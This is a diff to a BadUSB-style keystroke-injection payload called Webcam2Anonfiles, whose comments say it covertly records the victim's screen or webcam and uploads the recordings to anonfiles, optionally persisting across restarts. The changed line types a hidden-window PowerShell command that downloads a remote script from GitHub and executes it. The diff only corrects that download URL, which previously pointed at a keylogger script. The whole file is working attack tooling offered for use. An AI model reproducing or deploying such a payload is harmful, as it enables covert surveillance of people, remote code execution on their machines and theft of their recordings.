@@ -1,5 +1,5 @@
 REM Title: Webcam2Anonfiles
-REM Author: Oscar R.C.
+REM Author: Oscar R.C. (based on https://gist.github.com/quantumcore/3926dcb0215d802c0b48ddc640522e45)
 REM Description: Records the user screen and uploads the recording to anonfiles
 REM Usage: Add your Anonfiles token where it says ENTER_ANONFILES_TOKEN and edit the RecordTime (in seconds), Delay (in seconds) and TimesRun variable.
 REM If you want the WebcamLogger to persist between restarts set the $Persistent variable to $true
@@ -10,7 +10,7 @@ DELAY 500
 STRING CMD
 ENTER
 DELAY 500
-STRING powershell.exe -windowstyle hidden -command "$Anontoken='ENTER_ANONFILES_TOKEN';$RunTime=60;$TimesRun=6;$Delay=0;$Persistent=$false;Invoke-RestMethod https://raw.githubusercontent.com/Agente404/flipper/main/payloads/Keylogger2Discord/script.ps1 -OutFile ($env:temp+'\camlog.ps1');Invoke-Expression ($env:temp+'\camlog.ps1');"
+STRING powershell.exe -windowstyle hidden -command "$Anontoken='ENTER_ANONFILES_TOKEN';$RunTime=60;$TimesRun=6;$Delay=0;$Persistent=$false;Invoke-RestMethod https://raw.githubusercontent.com/Agente404/flipper/main/payloads/Webcam2Anonfiles/script.ps1 -OutFile ($env:temp+'\camlog.ps1');Invoke-Expression ($env:temp+'\camlog.ps1');"
 ENTER
 STRING exit
 ENTER
